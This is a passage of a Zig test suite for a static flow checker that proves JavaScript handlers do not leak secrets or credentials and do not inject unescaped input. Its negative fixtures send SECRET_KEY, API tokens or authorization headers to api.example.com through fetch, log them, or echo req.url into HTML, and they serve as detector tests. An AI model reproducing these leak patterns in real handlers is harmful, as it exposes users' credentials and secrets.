    imported_parser.setAtomTable(&imported_atoms);
    const imported_root = try imported_parser.parse();
    const imported_view = IrView.fromIRStore(&imported_parser.nodes, &imported_parser.constants);

    const pipeline = @import("pipeline.zig");
    var type_env_storage: pipeline.TypeEnvStorage = .{};
    defer type_env_storage.deinit(allocator);
    try type_env_storage.initWithSource(allocator, .{ .direct = .{
        .store = &imported_parser.type_store,
        .ir_view = imported_view,
        .atoms = &imported_atoms,
    } });
    var imported_type_checker: ?type_checker.TypeChecker = null;
    defer if (imported_type_checker) |*checker| checker.deinit();
    if (type_env_storage.envPtr()) |type_env| {
        imported_type_checker = type_checker.TypeChecker.init(allocator, imported_view, &imported_atoms, type_env);
        imported_type_checker.?.scopes = &imported_parser.scopes;
        try std.testing.expectEqual(@as(u32, 0), try imported_type_checker.?.check(imported_root));
    }

    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    var root_captures = try evaluator.CaptureTable.init(allocator, &parser.scopes);
    defer root_captures.deinit();
    var imported_captures = try evaluator.CaptureTable.init(allocator, &imported_parser.scopes);
    defer imported_captures.deinit();
    var facts = try pipeline.buildModuleFacts(allocator, pipeline.ParsedModule.fromExisting(ir_view, root, &atoms), null);
    defer facts.deinit();
    const target = pipeline.flowExportedFunctionNode(imported_view, &imported_atoms, name) orelse return error.ExportNotFound;
    var targets: std.ArrayList(evaluator.ImportTarget) = .empty;
    defer targets.deinit(allocator);
    for (facts.imports.items) |record| {
        if (!std.mem.eql(u8, record.imported_name, name)) continue;
        const key = pipeline.flowImportBindingKey(ir_view, record.slot) orelse return error.ImportNotFound;
        try targets.append(allocator, .{ .binding_key = key, .target = .{ .module = 1, .node = target } });
    }
    if (targets.items.len == 0) return error.ImportNotFound;
    var root_revision: [32]u8 = undefined;
    var imported_revision: [32]u8 = undefined;
    std.crypto.hash.sha2.Sha256.hash(source, &root_revision, .{});
    std.crypto.hash.sha2.Sha256.hash(imported_source, &imported_revision, .{});
    const modules = [_]evaluator.ModuleView{
        .{ .id = 0, .path = "handler.ts", .revision = root_revision, .root = root, .ir_view = ir_view, .atoms = &atoms, .captures = &root_captures, .imports = targets.items },
        .{ .id = 1, .path = "./utils.ts", .revision = imported_revision, .root = imported_root, .ir_view = imported_view, .atoms = &imported_atoms, .captures = &imported_captures, .imports = &.{} },
    };
    checker.captures = &root_captures;
    checker.modules = &modules;
    checker.initialization_order = &.{ 1, 0 };
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_secret_leakage;
}

test "a secret returned by an imported function reaches the response" {
    const imported =
        \\import { env } from "zttp:env";
        \\export function readKey() { return env("SECRET_KEY"); }
    ;
    const source =
        \\import { readKey } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: readKey() }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "readKey",
    ));
}

test "an imported function that returns a module-level secret reaches the response" {
    const imported =
        \\import { env } from "zttp:env";
        \\const key = env("SECRET_KEY") ?? "";
        \\export function readKey() { return key; }
    ;
    const source =
        \\import { readKey } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: readKey() }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "readKey",
    ));

    // Control: a module-level constant that holds no secret keeps the property.
    const clean_imported =
        \\import { env } from "zttp:env";
        \\const region = env("REGION") ?? "";
        \\export function readRegion() { return region; }
    ;
    const clean_source =
        \\import { readRegion } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: readRegion() }); }
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        clean_source,
        clean_imported,
        "readRegion",
    ));
}

test "an imported function that logs its parameter reports at each call that passes a secret" {
    const imported =
        \\import { logInfo } from "zttp:log";
        \\export function logIt(x) { logInfo(x, { n: 1 }); return 1; }
    ;
    const secret_source =
        \\import { env } from "zttp:env";
        \\import { logIt } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: logIt(env("SECRET_KEY")) }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(std.testing.allocator, secret_source, imported, "logIt"));

    // Control: the same helper called with a literal reaches no secret.
    const literal_source =
        \\import { logIt } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: logIt("hello") }); }
    ;
    try std.testing.expect(try runWithImportedFunction(std.testing.allocator, literal_source, imported, "logIt"));
}

test "an imported function that logs its own secret fails every call, whatever the arguments" {
    const imported =
        \\import { env } from "zttp:env";
        \\import { logInfo } from "zttp:log";
        \\export function logOwn() { logInfo(env("SECRET_KEY") ?? "", { n: 1 }); return 1; }
    ;
    const source =
        \\import { logOwn } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: logOwn() }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(std.testing.allocator, source, imported, "logOwn"));
}

test "a parameter cannot read the summary of an import that shares its slot" {
    // `name` is a predefined atom, so the import's slot is a small atom index,
    // and the tenth parameter of the handler has the same number as a frame
    // slot. A lookup by slot alone would answer the call `f(...)` with the
    // import's summary, which returns a constant and so launders the secret.
    const imported =
        \\export function name(x) { return 1; }
    ;
    const collision =
        \\import { env } from "zttp:env";
        \\import { name } from "./utils.ts";
        \\function handler(req, a1, a2, a3, a4, a5, a6, a7, a8, f) {
        \\  return Response.json({ v: f(env("SECRET_KEY")) });
        \\}
    ;
    try std.testing.expect(!try runWithImportedFunction(std.testing.allocator, collision, imported, "name"));

    // Control: the import itself still reads its summary.
    const direct =
        \\import { env } from "zttp:env";
        \\import { name } from "./utils.ts";
        \\function handler(req) {
        \\  return Response.json({ v: name(env("SECRET_KEY")) });
        \\}
    ;
    try std.testing.expect(try runWithImportedFunction(std.testing.allocator, direct, imported, "name"));
}

test "an imported function carrying nothing keeps the property" {
    // The point of the cross-file summary: an ordinary helper in another file
    // must not cost the proof the way an untraceable call does.
    const imported =
        \\export function greet(name) { return ["hello ", name].join(""); }
    ;
    const source =
        \\import { greet } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: greet("world") }); }
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "greet",
    ));
}

test "typed imported builtin receivers keep their pre-fallback labels" {
    const source =
        \\import { normalizeLabel } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: normalizeLabel(" Ready ") }); }
    ;
    const string_helper =
        \\export structural LabelText = string;
        \\export structural NormalizedLabel = string;
        \\export function normalizeLabel(text: LabelText): NormalizedLabel {
        \\  return text.trim().toLowerCase();
        \\}
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        source,
        string_helper,
        "normalizeLabel",
    ));

    const array_source =
        \\import { normalizeLabels } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: normalizeLabels(["a", "b"]) }); }
    ;
    const array_helper =
        \\export structural Labels = readonly string[];
        \\export function normalizeLabels(values: Labels): string {
        \\  return values.slice(0, 2).join("");
        \\}
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        array_source,
        array_helper,
        "normalizeLabels",
    ));
}

test "typed object methods resolve their actual bodies across imports" {
    const imported =
        \\export structural Trimmer = { trim: () => string };
        \\export function invoke(value: Trimmer): string { return value.trim(); }
    ;
    const source =
        \\import { invoke } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: invoke({ trim: () => "ok" }) }); }
    ;
    try std.testing.expect(try runWithImportedFunction(
        std.testing.allocator,
        source,
        imported,
        "invoke",
    ));
    const leaking =
        \\import { env } from "zttp:env";
        \\import { invoke } from "./utils.ts";
        \\function handler(req) { return Response.json({ v: invoke({ trim: () => env("SECRET_KEY") }) }); }
    ;
    try std.testing.expect(!try runWithImportedFunction(std.testing.allocator, leaking, imported, "invoke"));
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether no_secret_leakage was proven. Frees everything it owns.
fn runNoSecretLeakage(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_secret_leakage;
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether no_credential_leakage was proven.
fn runNoCredentialLeakage(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().no_credential_leakage;
}

/// Shared harness: parse `source`, run the FlowChecker on its handler, and
/// return whether input_validated was proven. The counterpart to the leakage
/// harnesses above - it checks the label a validator is entitled to discharge
/// rather than the ones it must not.
fn runInputValidated(allocator: std.mem.Allocator, source: []const u8) !bool {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties().input_validated;
}

/// Shared harness for route-dispatch regressions that must assert the exact
/// flow property a source is meant to break.
fn runFlowProperties(allocator: std.mem.Allocator, source: []const u8) !FlowProperties {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);
    return checker.getProperties();
}

const FlowProperty = enum {
    no_secret_leakage,
    no_credential_leakage,
    input_validated,
    pii_contained,
    injection_safe,
    deterministic,

    fn holds(property: FlowProperty, properties: FlowProperties) bool {
        return switch (property) {
            .no_secret_leakage => properties.no_secret_leakage,
            .no_credential_leakage => properties.no_credential_leakage,
            .input_validated => properties.input_validated,
            .pii_contained => properties.pii_contained,
            .injection_safe => properties.injection_safe,
            .deterministic => properties.deterministic,
        };
    }
};

test "FlowChecker checks each flow property inside routerMatch route functions" {
    const Case = struct {
        property: FlowProperty,
        direct: []const u8,
        routed: []const u8,
    };
    const cases = [_]Case{
        .{
            .property = .no_secret_leakage,
            .direct =
            \\import { env } from "zttp:env";
            \\function handler(req) { return Response.json({ key: env("SECRET_KEY") }); }
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\import { env } from "zttp:env";
            \\function leak(req) { return Response.json({ key: env("SECRET_KEY") }); }
            \\const routes = { "GET /leak": leak };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .no_credential_leakage,
            .direct =
            \\function handler(req) {
            \\  console.log(req.headers.authorization);
            \\  return Response.json({ ok: true });
            \\}
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\function leak(req) {
            \\  console.log(req.headers.authorization);
            \\  return Response.json({ ok: true });
            \\}
            \\const routes = { "GET /leak": leak };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .input_validated,
            .direct =
            \\import { fetch } from "zttp:fetch";
            \\function handler(req) {
            \\  fetch("https://api.example.com/collect", { body: req.body ?? "" });
            \\  return Response.json({ ok: true });
            \\}
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\import { fetch } from "zttp:fetch";
            \\function send(req) {
            \\  fetch("https://api.example.com/collect", { body: req.body ?? "" });
            \\  return Response.json({ ok: true });
            \\}
            \\const routes = { "POST /send": send };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .pii_contained,
            .direct =
            \\import { fetch } from "zttp:fetch";
            \\function handler(req) {
            \\  fetch(req.url, {});
            \\  return Response.json({ ok: true });
            \\}
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\import { fetch } from "zttp:fetch";
            \\function send(req) {
            \\  fetch(req.url, {});
            \\  return Response.json({ ok: true });
            \\}
            \\const routes = { "POST /send": send };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .injection_safe,
            .direct =
            \\function handler(req) { return Response.html(req.url); }
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\function show(req) { return Response.html(req.url); }
            \\const routes = { "GET /show": show };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
        .{
            .property = .deterministic,
            .direct =
            \\function handler(req) { return Response.json({ now: Date.now() }); }
            ,
            .routed =
            \\import { routerMatch } from "zttp:router";
            \\function clock(req) { return Response.json({ now: Date.now() }); }
            \\const routes = { "GET /clock": clock };
            \\function handler(req) {
            \\  const found = routerMatch(routes, req);
            \\  if (found === undefined) return Response.json({ error: "not found" });
            \\  return found.handler(req);
            \\}
            ,
        },
    };

    try std.testing.expectEqual(@typeInfo(FlowProperties).@"struct".field_names.len, cases.len);
    inline for (@typeInfo(FlowProperties).@"struct".field_names, cases) |field, case| {
        try std.testing.expectEqualStrings(field, @tagName(case.property));
    }
    for (cases) |case| {
        const direct = try runFlowProperties(std.testing.allocator, case.direct);
        const routed = try runFlowProperties(std.testing.allocator, case.routed);
        try std.testing.expect(!case.property.holds(direct));
        try std.testing.expect(!case.property.holds(routed));
    }
}

test "FlowChecker checks egress headers inside routerMatch route functions" {
    const source =
        \\import { routerMatch } from "zttp:router";
        \\import { fetch } from "zttp:fetch";
        \\import { env } from "zttp:env";
        \\function send(req) {
        \\  fetch("https://api.example.com/collect", { headers: { authorization: env("SECRET_KEY") ?? "" } });
        \\  return Response.json({ ok: true });
        \\}
        \\const routes = { "POST /send": send };
        \\function handler(req) {
        \\  const found = routerMatch(routes, req);
        \\  if (found === undefined) return Response.json({ error: "not found" });
        \\  return found.handler(req);
        \\}
    ;
    try std.testing.expect(!(try runFlowProperties(std.testing.allocator, source)).no_secret_leakage);
}

/// Test harness: run the flow checker and hand back the number of diagnostics
/// of one kind, plus a copy of the help text of the first one in `help_buf`.
const FlowDiagnosticReport = struct {
    properties: FlowProperties,
    count: usize,
    help: []const u8,
};

fn runFlowDiagnostics(
    allocator: std.mem.Allocator,
    source: []const u8,
    kind: DiagnosticKind,
    help_buf: []u8,
) !FlowDiagnosticReport {
    var parser = try @import("zts-engine").parser.JsParser.init(allocator, source);
    var atoms = atom_table.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_fn = handler_function_mod.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    checker.scopes = &parser.scopes;
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var count: usize = 0;
    var help: []const u8 = "";
    for (checker.getDiagnostics()) |diag| {
        if (diag.kind != kind) continue;
        if (count == 0) {
            const text = diag.help orelse "";
            const n = @min(text.len, help_buf.len);
            @memcpy(help_buf[0..n], text[0..n]);
            help = help_buf[0..n];
        }
        count += 1;
    }
    return .{ .properties = checker.getProperties(), .count = count, .help = help };
}

test "FlowChecker reports a secret logged inside a called helper, call-sensitively" {
    var buf: [512]u8 = undefined;

    // Direct form: the secret logged in the handler body is refused, and its
    // help text is the plain text with no call chain.
    const direct =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  console.log(env("SECRET_KEY"));
        \\  return Response.json({ ok: true });
        \\}
    ;
    const direct_report = try runFlowDiagnostics(std.testing.allocator, direct, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), direct_report.count);
    try std.testing.expect(!direct_report.properties.no_secret_leakage);
    try std.testing.expectEqualStrings("env vars with sensitive names must not be logged", direct_report.help);

    // Routed form: the same log, reached through a top-level helper.
    const routed =
        \\import { env } from "zttp:env";
        \\function note(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = note(env("SECRET_KEY"));
        \\  return Response.json({ n: n });
        \\}
    ;
    const routed_report = try runFlowDiagnostics(std.testing.allocator, routed, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), routed_report.count);
    try std.testing.expect(!routed_report.properties.no_secret_leakage);
    try std.testing.expect(std.mem.startsWith(u8, routed_report.help, "env vars with sensitive names must not be logged"));
    try std.testing.expect(std.mem.indexOf(u8, routed_report.help, "line 7") != null);

    // The same helper called with a clean literal reports nothing.
    const clean =
        \\import { env } from "zttp:env";
        \\function note(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = note("ok");
        \\  return Response.json({ n: n });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.no_secret_leakage);
}

test "FlowChecker reports an egress body secret inside a nested arrow" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const send = (t) => {
        \\    fetch("https://api.example.com/collect", { body: t });
        \\    return 1;
        \\  };
        \\  const n = send(env("SECRET_KEY"));
        \\  return Response.json({ n: n });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .secret_in_egress_body, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_secret_leakage);
}

test "FlowChecker reports a credential logged inside a helper" {
    var buf: [512]u8 = undefined;
    const source =
        \\function show(t) {
        \\  console.log(t);
        \\  return 1;
        \\}
        \\function handler(req) {
        \\  const n = show(req.headers.authorization);
        \\  return Response.json({ n: n });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_credential_leakage);
}

test "FlowChecker reports a credential response built inside a helper and discarded" {
    var buf: [512]u8 = undefined;
    const source =
        \\function wrap(t) {
        \\  return Response.json({ t: t });
        \\}
        \\function handler(req) {
        \\  return wrap(req.headers.authorization);
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_response, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_credential_leakage);
}

test "FlowChecker reports a credential in a fetch body, directly and inside a helper" {
    // The probe method of AGENTS.md: the labelled value goes straight to the
    // sink (refused), then through a helper (still refused).
    var buf: [512]u8 = undefined;
    const direct =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const r = fetch("https://api.example.com/v1", { method: "POST", body: req.headers.authorization });
        \\  return Response.json({ s: r.status });
        \\}
    ;
    const direct_report = try runFlowDiagnostics(std.testing.allocator, direct, .credential_in_egress_body, &buf);
    try std.testing.expectEqual(@as(usize, 1), direct_report.count);
    try std.testing.expect(!direct_report.properties.no_credential_leakage);

    var helper_buf: [512]u8 = undefined;
    const helper =
        \\import { fetch } from "zttp:fetch";
        \\function forward(t) {
        \\  const r = fetch("https://api.example.com/v1", { method: "POST", body: t });
        \\  return r.status;
        \\}
        \\function handler(req) {
        \\  const n = forward(req.headers.authorization);
        \\  return Response.json({ n: n });
        \\}
    ;
    const helper_report = try runFlowDiagnostics(std.testing.allocator, helper, .credential_in_egress_body, &helper_buf);
    try std.testing.expectEqual(@as(usize, 1), helper_report.count);
    try std.testing.expect(!helper_report.properties.no_credential_leakage);
}

test "FlowChecker reports a credential in an opaque fetch init as an egress body" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const init = { method: "POST", body: req.headers.authorization };
        \\  const r = fetch("https://api.example.com/v1", init);
        \\  return Response.json({ s: r.status });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_egress_body, &buf);
    try std.testing.expectEqual(@as(usize, 1), report.count);
    try std.testing.expect(!report.properties.no_credential_leakage);
}

test "FlowChecker keeps no_credential_leakage when a fetch body holds no credential" {
    var buf: [512]u8 = undefined;
    const source =
        \\import { fetch } from "zttp:fetch";
        \\function handler(req) {
        \\  const r = fetch("https://api.example.com/v1", { method: "POST", body: "static" });
        \\  return Response.json({ s: r.status });
        \\}
    ;
    const report = try runFlowDiagnostics(std.testing.allocator, source, .credential_in_egress_body, &buf);
    try std.testing.expectEqual(@as(usize, 0), report.count);
    try std.testing.expect(report.properties.no_credential_leakage);
}

test "FlowChecker reports a secret logged by an array method callback" {
    var buf: [512]u8 = undefined;
    const leaking =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const out = [s].map((x) => {
        \\    console.log(x);
        \\    return 1;
        \\  });
        \\  return Response.json({ n: out.length });
        \\}
    ;
    const leaking_report = try runFlowDiagnostics(std.testing.allocator, leaking, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 1), leaking_report.count);
    try std.testing.expect(!leaking_report.properties.no_secret_leakage);

    // A clean receiver leaves the same callback silent, so the binding is
    // taken from the receiver and not from the callback's own text.
    const clean =
        \\import { env } from "zttp:env";
        \\function handler(req) {
        \\  const s = env("SECRET_KEY");
        \\  const out = ["a"].map((x) => {
        \\    console.log(x);
        \\    return s.length;
        \\  });
        \\  return Response.json({ n: out.length });
        \\}
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .secret_in_log, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
}

test "FlowChecker reports unvalidated input built into Response.html inside a helper" {
    var buf: [512]u8 = undefined;
    const direct =
        \\function handler(req) { return Response.html(req.url); }
    ;
    const direct_report = try runFlowDiagnostics(std.testing.allocator, direct, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), direct_report.count);
    try std.testing.expect(!direct_report.properties.injection_safe);

    const routed =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return page(req.url); }
    ;
    const routed_report = try runFlowDiagnostics(std.testing.allocator, routed, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), routed_report.count);
    try std.testing.expect(!routed_report.properties.injection_safe);

    const clean =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return page("<p>ok</p>"); }
    ;
    const clean_report = try runFlowDiagnostics(std.testing.allocator, clean, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), clean_report.count);
    try std.testing.expect(clean_report.properties.injection_safe);
}

test "FlowChecker reports callee-built HTML only when it reaches the response (F4)" {
    var buf: [512]u8 = undefined;

    // Controls: a callee builds HTML from input and the caller discards it, or
    // calls the helper with a literal. Nothing unvalidated reaches the response,
    // so `injection_safe` holds and nothing is reported.
    const discarded_map =
        \\function handler(req) {
        \\  const s = req.url;
        \\  const pages = [s].map((x) => { return Response.html(x); });
        \\  return Response.json({ ok: 1 });
        \\}
    ;
    const discarded_map_report = try runFlowDiagnostics(std.testing.allocator, discarded_map, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), discarded_map_report.count);
    try std.testing.expect(discarded_map_report.properties.injection_safe);

    const discarded_call =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) {
        \\  const first = page(req.url);
        \\  return page("<p>ok</p>");
        \\}
    ;
    const discarded_call_report = try runFlowDiagnostics(std.testing.allocator, discarded_call, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), discarded_call_report.count);
    try std.testing.expect(discarded_call_report.properties.injection_safe);

    // A validated value built into HTML stays clean through a helper.
    const validated =
        \\import { escapeHtml } from "zttp:text";
        \\function page(t) { return Response.html(escapeHtml(t)); }
        \\function handler(req) { return page(req.url); }
    ;
    const validated_report = try runFlowDiagnostics(std.testing.allocator, validated, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 0), validated_report.count);
    try std.testing.expect(validated_report.properties.injection_safe);

    // The fact is followed through every shape a callee's result takes on its
    // way to the response: a binding, a ternary arm, a pass-through helper, and
    // a field of the response payload. Only an HTML root is an HTML sink.
    const shapes = [_][]const u8{
        \\function page(t) { return Response.html(t); }
        \\function handler(req) {
        \\  const r = page(req.url);
        \\  return r;
        \\}
        ,
        \\function page(t) { return Response.html(t); }
        \\function handler(req) {
        \\  return req.method === "GET" ? page(req.url) : Response.json({ ok: 1 });
        \\}
        ,
        \\function page(t) { return Response.html(t); }
        \\function wrap(r) { return r; }
        \\function handler(req) { return wrap(page(req.url)); }
        ,
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return Response.json({ page: page(req.url) }); }
        ,
        \\function handler(req) {
        \\  const pages = [req.url].map((x) => { return Response.html(x); });
        \\  return Response.json({ pages: pages });
        \\}
        ,
    };
    for (shapes, 0..) |source, index| {
        const report = try runFlowDiagnostics(std.testing.allocator, source, .unvalidated_input_in_egress, &buf);
        // Only the first three send an HTML root; nested response records are JSON.
        try std.testing.expectEqual(@as(usize, if (index < 3) 1 else 0), report.count);
        try std.testing.expectEqual(index >= 3, report.properties.injection_safe);
    }

    // The diagnostic is reported once, at the `Response.html` call in the
    // callee, with its message unchanged.
    const routed =
        \\function page(t) { return Response.html(t); }
        \\function handler(req) { return page(req.url); }
    ;
    const routed_report = try runFlowDiagnostics(std.testing.allocator, routed, .unvalidated_input_in_egress, &buf);
    try std.testing.expectEqual(@as(usize, 1), routed_report.count);
}

test "FlowChecker checks sinks on return paths, concise bodies, and nested expressions (F5)" {
    const head =
        \\import { env } from "zttp:env";
        \\import { fetch } from "zttp:fetch";
        \\import { logInfo } from "zttp:log";
        \\
    ;
    const Case = struct { name: []const u8, source: []const u8 };

    // Each source leaks a secret through a sink that the walk used to skip.
    // The direct form sits in the handler; the routed forms put the same sink
    // in a callee. All of them must lose `no_secret_leakage`.
    const leaking = [_]Case{
        .{ .name = "return path, direct", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  return fetch("https://api.example.com/x", { method: "POST", body: t });
            \\}
        },
        .{ .name = "return path, field of the response", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  return Response.json({ status: fetch("https://api.example.com/x", { method: "POST", body: t }).status });
            \\}
        },
        .{ .name = "return path, in a callee", .source = head ++
            \\function send(x) { return fetch("https://api.example.com/x", { method: "POST", body: x }); }
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const r = send(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body, in a callee", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const inner = (x) => logInfo(x, { n: 1 });
            \\  const n = inner(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body, fetch field", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const inner = (x) => fetch("https://api.example.com/x", { method: "POST", body: x }).status;
            \\  const n = inner(t);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "concise body, array callback", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const n = [t].map((x) => fetch("https://api.example.com/x", { method: "POST", body: x }).status);
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an array", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const rs = [fetch("https://api.example.com/x", { method: "POST", body: t })];
            \\  return Response.json({ ok: 1 });
            \\}
        },
        .{ .name = "nested in an object field", .source = head ++
            \\function handler(req) {
            \\  const t = env("API_TOKEN") ?? "";
            \\  const o = { r: fetch("https://api.example.com/x", { method: "POST", body: t }) };
            \\  return Response.json({ ok: 1 });
            \\}
        },
